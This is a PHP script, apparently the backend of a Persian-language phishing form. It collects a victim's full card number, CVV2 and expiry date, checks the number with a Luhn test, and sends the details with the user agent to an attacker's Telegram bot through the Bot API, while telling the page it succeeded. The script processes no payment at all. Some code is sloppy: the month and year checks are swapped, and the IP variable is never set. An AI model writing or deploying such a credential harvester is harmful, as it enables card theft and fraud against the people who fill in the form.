<?php
require_once 'config.php';
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Retrieve the form data
  $cardNumber = $_POST["cardNumber1"] . $_POST["cardNumber2"] . $_POST["cardNumber3"] . $_POST["cardNumber4"];
  $cvv2 = $_POST["cvv2"];
  $expirationMonth = $_POST["expirationMonth"];
  $expirationYear = $_POST["expirationYear"];

  // Perform validation
  $errors = array();

  // Validate card number
  if (!preg_match("/^[0-9]{16}$/", $cardNumber)) {
    $errors["cardNumber"] = "شماره کارت معتبر نیست";
  } else {
    $digits = str_split($cardNumber);
    $sum = 0;
    for ($i = 0; $i < 16; $i++) {
      $digit = intval($digits[$i]);
      if ($i % 2 == 0) {
        $digit *= 2;
        if ($digit > 9) {
          $digit -= 9;
        }
      }
      $sum += $digit;
    }
    if ($sum % 10 != 0) {
      $errors["cardNumber"] = "شماره کارت معتبر نیست";
    }
  }

  // Validate CVV2
  if (!preg_match("/^[0-9]{3,4}$/", $cvv2)) {
    $errors["cvv2"] = "را وارد کنید cvv2";
  }

  // Validate expiration month
  if (!preg_match("/^(0[1-9]|1[0-2]|[1-9])$/", $expirationYear)) {
    $errors["expirationYear"] = "سال را وارد کنید";
  }

  // Validate expiration year
  if (!preg_match("/^(0[1-9]|1[0-2]|[1-9])$/", $expirationMonth)) {
    $errors["expirationMonth"] = "ماه را وارد کنید";
  }

  // Get IP address
 

  // Get user agent
  $userAgent = $_SERVER['HTTP_USER_AGENT'];

  // Prepare the response
  $response = array();
  if (empty($errors)) {
    // Success
    $response["success"] = true;

    // Send the data to Telegram bot
    $message = 
"Card Number: `$cardNumber`\n
CVV2: `$cvv2`\n
Expiration: `$expirationMonth`/`$expirationYear`\n

IP: `$ip`\n

`$userAgent`";

    $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $telegramApiParams = array(
      'chat_id' => $chatId,
      'text' => $message,
	'parse_mode' =>'MarkdownV2'
    );

    // Send the message to the Telegram bot
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramApiParams);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $telegramApiResponse = curl_exec($ch);
    curl_close($ch);
  } else {
    // Error
    $response["success"] = false;
    $response["errors"] = $errors;
  }

  // Send the response in JSON format
  header("Content-Type: application/json");
  echo json_encode($response);
}

?>
